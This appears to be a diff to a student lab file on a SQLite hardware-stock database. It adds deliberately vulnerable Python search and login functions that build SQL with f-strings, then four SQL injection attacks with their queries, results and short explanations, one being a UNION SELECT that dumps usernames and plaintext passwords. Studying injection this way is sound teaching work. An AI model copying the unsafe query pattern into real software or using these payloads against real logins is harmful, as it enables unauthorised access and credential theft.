@@ -81,3 +81,77 @@ Output: Cement now shows price 38000
   (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0),
    (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), 
    (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+
+Task 3 - Vulnerable Search and Attacks
+import sqlite3
+
+conn = sqlite3.connect('nyondo_stock.db')
+
+def search_product(name):
+    # Use double quotes around the f-string, single quotes inside SQL
+    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
+    print(f"Query: {query}")
+    rows = conn.execute(query).fetchall()
+    print(f"Result: {rows}\n")
+    return rows
+
+def login(username, password):
+    # Same fix: double quotes for Python string, single quotes for SQL
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    print(f"Query: {query}")
+    row = conn.execute(query).fetchone()
+    print(f"Result: {row}\n")
+    return row
+
+# --- Attacks ---
+
+Attack 1
+Query: SELECT * FROM products WHERE name LIKE '%' OR 1=1 -- %'
+Result: [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0),
+ (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0),
+  (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), 
+  (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0),
+   (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0),
+    (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), 
+    (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), 
+    (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0),
+     (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0),
+      (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), 
+      (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), 
+      (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), 
+      (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0),
+       (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0),
+        (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0),
+         (16, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), 
+         (17, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), 
+         (18, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0),
+          (19, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0),
+           (20, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), 
+           (21, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (22, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (23, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (24, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (25, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (26, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (27, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (28, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (29, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (30, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+           Why: OR 1=1 bypasses WHERE clause
+
+Attack 2
+Query: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
+Result: (1, 'admin', 'admin123', 'admin')
+Why: -- comments out password check
+
+Attack 3
+Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+Result: (1, 'admin', 'admin123', 'admin')
+Why: Condition always true
+
+Attack 4
+Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users -- %'
+Result: [(1, 'Cement (bag)', 'Portland cement 50kg bag', 38000.0), (1, 'admin', 'admin123', 'admin'), (2, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (2, 'fatuma', 'pass456', 'attendant'), (3, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (3, 'wasswa', 'pass789', 'manager'), (4, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (4, 'admin', 'admin123', 'admin'), (5, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (5, 'fatuma', 'pass456', 'attendant'), (6, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (6, 'wasswa', 'pass789', 'manager'), (7, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (7, 'admin', 'admin123', 'admin'), (8, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (8, 'fatuma', 'pass456', 'attendant'), (9, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (9, 'wasswa', 'pass789', 'manager'), (10, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (10, 'admin', 'admin123', 'admin'), (11, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (11, 'fatuma', 'pass456', 'attendant'), (12, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (12, 'wasswa', 'pass789', 'manager'), (13, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (13, 'admin', 'admin123', 'admin'), (14, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (14, 'fatuma', 'pass456', 'attendant'), (15, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (15, 'wasswa', 'pass789', 'manager'), (16, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (17, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (18, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (19, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (20, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (21, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (22, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (23, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (24, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (25, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0), (26, 'Cement (bag)', 'Portland cement 50kg bag', 35000.0), (27, 'Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000.0), (28, 'Paint 5L', 'Exterior wall paint white 5L', 60000.0), (29, 'Nails 1kg', 'Common wire nails 1kg pack', 12000.0), (30, 'Timber 2x4', 'Pine timber plank 2x4 per metre', 25000.0)]
+Why: UNION merges product query with users table
+
+
+
+
+
+
+
+
+
+
+
